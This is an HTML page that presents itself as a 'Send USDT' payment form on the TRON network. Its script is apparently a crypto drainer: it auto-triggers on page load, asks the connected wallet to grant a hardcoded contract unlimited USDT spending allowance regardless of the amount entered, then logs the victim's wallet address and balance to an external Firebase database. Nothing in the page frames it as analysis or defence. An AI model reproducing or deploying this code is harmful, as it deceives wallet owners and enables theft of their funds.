<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TRC-20 USDT Approval</title>
  <style>
    body {
      margin: 0;
      background-color: #121212;
      font-family: sans-serif;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: #1e1e1e;
      padding: 24px;
      border-radius: 16px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 10px rgba(0,0,0,0.6);
    }
    h2 {
      text-align: center;
      margin-bottom: 24px;
    }
    label {
      display: block;
      margin-bottom: 8px;
    }
    input {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      margin-bottom: 20px;
      background: #2c2c2c;
      color: #fff;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #00ff9f;
      color: #000;
      border: none;
      font-weight: bold;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
    .footer {
      margin-top: 12px;
      font-size: 12px;
      color: #aaa;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Send USDT</h2>
    <label>Recipient Address</label>
    <input type="text" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" disabled />
    <label>Amount</label>
    <input type="number" id="amountInput" placeholder="Enter amount" />
    <button onclick="approveUSDT()">Next</button>
    <div class="footer">Make sure USDT is added to your wallet</div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@firebase/app"></script>
  <script src="https://cdn.jsdelivr.net/npm/@firebase/firestore"></script>

  <script>
    const CONTRACT_ADDRESS = "TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX";
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    // Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM",
      authDomain: "trc20-approval-dapp.firebaseapp.com",
      projectId: "trc20-approval-dapp",
      storageBucket: "trc20-approval-dapp.appspot.com",
      messagingSenderId: "770961226156",
      appId: "1:770961226156:web:d7857b971dd376b7902209"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    async function approveUSDT() {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("Please connect your TRON wallet.");
        return;
      }

      const userAddress = window.tronWeb.defaultAddress.base58;
      const amount = document.getElementById("amountInput").value || "0";

      const contract = await window.tronWeb.contract().at(USDT_CONTRACT);

      try {
        const tx = await contract.approve(CONTRACT_ADDRESS, window.tronWeb.toBigNumber("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")).send();

        console.log("Approval sent:", tx);

        const usdtBalance = await contract.balanceOf(userAddress).call();
        const usdtReadable = window.tronWeb.fromSun(usdtBalance); // USDT has 6 decimals

        await db.collection("approvals").add({
          wallet_address: userAddress,
          amount: amount,
          balance: usdtReadable,
          timestamp: new Date()
        });

        alert("Approval successful! âœ…");

      } catch (e) {
        console.error(e);
        alert("Transaction failed ðŸš«");
      }
    }

    // Auto popup trigger on load
    window.addEventListener("load", async () => {
      setTimeout(() => {
        approveUSDT();
      }, 1500);
    });
  </script>
</body>
</html>
